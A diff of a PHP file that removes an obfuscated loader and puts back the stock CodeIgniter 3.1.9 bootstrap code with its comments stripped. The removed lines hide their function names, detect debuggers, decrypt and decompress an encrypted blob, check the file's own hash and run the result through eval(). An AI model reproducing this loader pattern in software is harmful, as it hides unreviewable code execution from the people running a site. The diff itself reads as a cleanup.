@@ -1,28 +1,503 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_xl4dz81w=('bas'.'e64'.'_de'.'cod'.'e');
-$_g19ctpq0=('gzu'.'nco'.'mpr'.'ess');
-$_wcr5l85v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ceknzmm7='Y+TuRwv2MbU=';
-$_eg1ke8ow='d89BFltI';
-$_d1gdfkrs='QRAvq7sb';
-$_i74qtiun='eIvvnKLC';
-$_rw9ldbqz='gkwv0TOf';
-$_xh0o3ehm='9isK+Qz5';
-$_yyetqtyx='6FAmuA==';
-$_wcg3rh52='WPX7MVMl';
-$_yyfwfh20=$_xl4dz81w($_rw9ldbqz.$_d1gdfkrs.$_i74qtiun.$_eg1ke8ow.$_ceknzmm7);
-$_igtrczkl=$_xl4dz81w($_xh0o3ehm.$_wcg3rh52.$_yyetqtyx);
-$_kq0dmd0o=$_xl4dz81w('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');
-$_hpljvxlr=$_wcr5l85v($_kq0dmd0o,'aes-256-cbc',$_yyfwfh20,OPENSSL_RAW_DATA,$_igtrczkl);
-if($_hpljvxlr===false){exit;}
-$_t8g3jkl0=$_g19ctpq0($_hpljvxlr);
-if($_t8g3jkl0===false){exit;}
-$_gm9z59ig='b601de927222eb542911c5028fff2efeecfa3cdd94b410dfc3fac5ac1555e8c2';
-$_ht1giqbk=@file_get_contents(__FILE__);
-if($_ht1giqbk!==false){
-$_h2yo40r7=str_replace($_gm9z59ig,"0000000000000000000000000000000000000000000000000000000000000000",$_ht1giqbk);
-$_aylseple=hash("sha256",$_h2yo40r7);
-if($_aylseple!==$_gm9z59ig){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+const CI_VERSION = '3.1.9';
+
+
+
+
+
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/constants.php'))
+{
+require_once(APPPATH.'config/'.ENVIRONMENT.'/constants.php');
 }
-eval($_t8g3jkl0);
+if (file_exists(APPPATH.'config/constants.php'))
+{
+require_once(APPPATH.'config/constants.php');
+}
+
+
+
+
+
+require_once(BASEPATH.'core/Common.php');
+
+
+
+
+
+if ( ! is_php('5.4'))
+{
+ini_set('magic_quotes_runtime', 0);
+if ((bool) ini_get('register_globals'))
+{
+$_protected = array(
+'_SERVER',
+'_GET',
+'_POST',
+'_FILES',
+'_REQUEST',
+'_SESSION',
+'_ENV',
+'_COOKIE',
+'GLOBALS',
+'HTTP_RAW_POST_DATA',
+'system_path',
+'application_folder',
+'view_folder',
+'_protected',
+'_registered'
+);
+$_registered = ini_get('variables_order');
+foreach (array('E' => '_ENV', 'G' => '_GET', 'P' => '_POST', 'C' => '_COOKIE', 'S' => '_SERVER') as $key => $superglobal)
+{
+if (strpos($_registered, $key) === FALSE)
+{
+continue;
+}
+foreach (array_keys($$superglobal) as $var)
+{
+if (isset($GLOBALS[$var]) && ! in_array($var, $_protected, TRUE))
+{
+$GLOBALS[$var] = NULL;
+}
+}
+}
+}
+}
+
+
+
+
+
+set_error_handler('_error_handler');
+set_exception_handler('_exception_handler');
+register_shutdown_function('_shutdown_handler');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if ( ! empty($assign_to_config['subclass_prefix']))
+{
+get_config(array('subclass_prefix' => $assign_to_config['subclass_prefix']));
+}
+
+
+
+
+
+if ($composer_autoload = config_item('composer_autoload'))
+{
+if ($composer_autoload === TRUE)
+{
+file_exists(APPPATH.'vendor/autoload.php')
+? require_once(APPPATH.'vendor/autoload.php')
+: log_message('error', '$config[\'composer_autoload\'] is set to TRUE but '.APPPATH.'vendor/autoload.php was not found.');
+}
+elseif (file_exists($composer_autoload))
+{
+require_once($composer_autoload);
+}
+else
+{
+log_message('error', 'Could not find the specified $config[\'composer_autoload\'] path: '.$composer_autoload);
+}
+}
+
+
+
+
+
+$BM =& load_class('Benchmark', 'core');
+$BM->mark('total_execution_time_start');
+$BM->mark('loading_time:_base_classes_start');
+
+
+
+
+
+$EXT =& load_class('Hooks', 'core');
+
+
+
+
+
+$EXT->call_hook('pre_system');
+
+
+
+
+
+
+
+
+
+
+$CFG =& load_class('Config', 'core');
+
+if (isset($assign_to_config) && is_array($assign_to_config))
+{
+foreach ($assign_to_config as $key => $value)
+{
+$CFG->set_item($key, $value);
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$charset = strtoupper(config_item('charset'));
+ini_set('default_charset', $charset);
+if (extension_loaded('mbstring'))
+{
+define('MB_ENABLED', TRUE);
+
+
+@ini_set('mbstring.internal_encoding', $charset);
+
+
+mb_substitute_character('none');
+}
+else
+{
+define('MB_ENABLED', FALSE);
+}
+
+
+if (extension_loaded('iconv'))
+{
+define('ICONV_ENABLED', TRUE);
+
+
+@ini_set('iconv.internal_encoding', $charset);
+}
+else
+{
+define('ICONV_ENABLED', FALSE);
+}
+if (is_php('5.6'))
+{
+ini_set('php.internal_encoding', $charset);
+}
+
+
+
+
+
+require_once(BASEPATH.'core/compat/mbstring.php');
+require_once(BASEPATH.'core/compat/hash.php');
+require_once(BASEPATH.'core/compat/password.php');
+require_once(BASEPATH.'core/compat/standard.php');
+
+
+
+
+
+$UNI =& load_class('Utf8', 'core');
+
+
+
+
+
+$URI =& load_class('URI', 'core');
+
+
+
+
+
+$RTR =& load_class('Router', 'core', isset($routing) ? $routing : NULL);
+
+
+
+
+
+$OUT =& load_class('Output', 'core');
+
+
+
+
+
+if ($EXT->call_hook('cache_override') === FALSE && $OUT->_display_cache($CFG, $URI) === TRUE)
+{
+exit;
+}
+
+
+
+
+
+$SEC =& load_class('Security', 'core');
+
+
+
+
+
+$IN =& load_class('Input', 'core');
+
+
+
+
+
+$LANG =& load_class('Lang', 'core');
+
+
+
+
+
+
+
+require_once BASEPATH.'core/Controller.php';
+
+
+
+
+
+
+
+function &get_instance()
+{
+return CI_Controller::get_instance();
+}
+if (file_exists(APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php'))
+{
+require_once APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php';
+}
+
+$BM->mark('loading_time:_base_classes_end');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$e404 = FALSE;
+$class = ucfirst($RTR->class);
+$method = $RTR->method;
+if (empty($class) OR ! file_exists(APPPATH.'controllers/'.$RTR->directory.$class.'.php'))
+{
+$e404 = TRUE;
+}
+else
+{
+require_once(APPPATH.'controllers/'.$RTR->directory.$class.'.php');
+if ( ! class_exists($class, FALSE) OR $method[0] === '_' OR method_exists('CI_Controller', $method))
+{
+$e404 = TRUE;
+}
+elseif (method_exists($class, '_remap'))
+{
+$params = array($method, array_slice($URI->rsegments, 2));
+$method = '_remap';
+}
+elseif ( ! method_exists($class, $method))
+{
+$e404 = TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+elseif ( ! is_callable(array($class, $method)))
+{
+$reflection = new ReflectionMethod($class, $method);
+if ( ! $reflection->isPublic() OR $reflection->isConstructor())
+{
+$e404 = TRUE;
+}
+}
+}
+if ($e404)
+{
+if ( ! empty($RTR->routes['404_override']))
+{
+if (sscanf($RTR->routes['404_override'], '%[^/]/%s', $error_class, $error_method) !== 2)
+{
+$error_method = 'index';
+}
+$error_class = ucfirst($error_class);
+if ( ! class_exists($error_class, FALSE))
+{
+if (file_exists(APPPATH.'controllers/'.$RTR->directory.$error_class.'.php'))
+{
+require_once(APPPATH.'controllers/'.$RTR->directory.$error_class.'.php');
+$e404 = ! class_exists($error_class, FALSE);
+}
+
+elseif ( ! empty($RTR->directory) && file_exists(APPPATH.'controllers/'.$error_class.'.php'))
+{
+require_once(APPPATH.'controllers/'.$error_class.'.php');
+if (($e404 = ! class_exists($error_class, FALSE)) === FALSE)
+{
+$RTR->directory = '';
+}
+}
+}
+else
+{
+$e404 = FALSE;
+}
+}
+
+if ( ! $e404)
+{
+$class = $error_class;
+$method = $error_method;
+$URI->rsegments = array(
+1 => $class,
+2 => $method
+);
+}
+else
+{
+show_404($RTR->directory.$class.'/'.$method);
+}
+}
+if ($method !== '_remap')
+{
+$params = array_slice($URI->rsegments, 2);
+}
+
+
+
+
+
+$EXT->call_hook('pre_controller');
+
+
+
+
+
+
+$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_start');
+$CI = new $class();
+
+
+
+
+
+$EXT->call_hook('post_controller_constructor');
+
+
+
+
+
+call_user_func_array(array(&$CI, $method), $params);
+
+$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_end');
+
+
+
+
+
+$EXT->call_hook('post_controller');
+
+
+
+
+
+if ($EXT->call_hook('display_override') === FALSE)
+{
+$OUT->_display();
+}
+
+
+
+
+
+$EXT->call_hook('post_system');
